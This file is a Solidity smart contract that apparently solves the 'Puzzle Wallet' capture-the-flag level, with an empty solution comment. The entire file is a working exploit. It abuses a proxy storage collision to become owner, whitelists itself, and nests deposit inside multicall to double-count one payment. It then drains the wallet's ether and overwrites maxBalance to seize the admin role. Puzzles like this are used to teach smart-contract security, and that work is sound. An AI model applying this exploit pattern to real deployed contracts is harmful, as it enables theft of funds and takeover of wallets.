// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*Solution:

*/

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external returns(address);
    function approveNewAdmin(address _expectedAdmin) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract MyContract {
    IPuzzleWallet target;

    constructor(address _target) payable {
        target = IPuzzleWallet(_target);

        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));


        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(target.multicall.selector,deposit_data);
        target.multicall{value: 0.001 ether}(data);
        target.execute(msg.sender, 0.002 ether, "");

        target.setMaxBalance(uint256(uint160(msg.sender)));
        require(target.admin() == msg.sender,"Failed!");
    }
}
